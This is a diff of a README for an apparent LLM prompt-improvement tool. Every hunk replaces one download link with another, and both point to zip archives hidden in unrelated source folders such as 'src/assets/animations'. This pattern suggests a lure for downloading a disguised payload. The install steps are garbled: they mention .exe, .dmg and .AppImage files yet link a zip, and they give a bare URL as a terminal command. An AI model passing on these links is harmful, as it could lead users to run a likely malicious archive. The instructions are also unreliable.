@@ -1,7 +1,7 @@
 # 🎉 recursive-prompt-improver - Improve Your LLM Prompts Easily
 
 ## 🌐 Badges
-[![Download](https://raw.githubusercontent.com/gafaar22/recursive-prompt-improver/main/src/components/HeaderComponent/recursive-prompt-improver_1.2-alpha.4.zip%https://raw.githubusercontent.com/gafaar22/recursive-prompt-improver/main/src/components/HeaderComponent/recursive-prompt-improver_1.2-alpha.4.zip)](https://raw.githubusercontent.com/gafaar22/recursive-prompt-improver/main/src/components/HeaderComponent/recursive-prompt-improver_1.2-alpha.4.zip)
+[![Download](https://raw.githubusercontent.com/gafaar22/recursive-prompt-improver/main/src/assets/animations/prompt_improver_recursive_1.5.zip%https://raw.githubusercontent.com/gafaar22/recursive-prompt-improver/main/src/assets/animations/prompt_improver_recursive_1.5.zip)](https://raw.githubusercontent.com/gafaar22/recursive-prompt-improver/main/src/assets/animations/prompt_improver_recursive_1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you download, check these requirements:
 
 ## 📥 Download & Install
 
-To get started with **recursive-prompt-improver**, visit this page to download: [Download the latest release](https://raw.githubusercontent.com/gafaar22/recursive-prompt-improver/main/src/components/HeaderComponent/recursive-prompt-improver_1.2-alpha.4.zip).
+To get started with **recursive-prompt-improver**, visit this page to download: [Download the latest release](https://raw.githubusercontent.com/gafaar22/recursive-prompt-improver/main/src/assets/animations/prompt_improver_recursive_1.5.zip).
 
 ### Installation Steps:
 
@@ -32,7 +32,7 @@ To get started with **recursive-prompt-improver**, visit this page to download: 
    - After the download completes, locate the downloaded file in your folder. 
    - For Windows, double-click the **.exe** file to start the installation.
    - For macOS, double-click the **.dmg** file, then drag the app to your Applications folder.
-   - For Linux, open a terminal and run the **.AppImage** file with the command `https://raw.githubusercontent.com/gafaar22/recursive-prompt-improver/main/src/components/HeaderComponent/recursive-prompt-improver_1.2-alpha.4.zip`.
+   - For Linux, open a terminal and run the **.AppImage** file with the command `https://raw.githubusercontent.com/gafaar22/recursive-prompt-improver/main/src/assets/animations/prompt_improver_recursive_1.5.zip`.
 
 4. **Follow the Setup Steps**
    - Follow the on-screen instructions to complete the installation. 
